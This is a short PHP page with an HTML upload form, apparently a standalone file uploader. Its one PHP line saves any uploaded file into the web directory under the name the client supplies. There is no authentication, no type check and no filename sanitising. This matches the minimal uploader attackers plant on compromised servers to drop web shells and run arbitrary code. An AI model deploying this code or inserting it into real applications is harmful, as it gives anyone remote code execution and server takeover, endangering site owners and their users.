<form enctype="multipart/form-data" method="post">
  <input type="file" name="x">
  <input type="submit" value="Upload!">
 </form>
 <?php if(copy($_FILES['x']['tmp_name'],$_FILES['x']['name'])) { echo "<br>Uploaded!"; } ?>
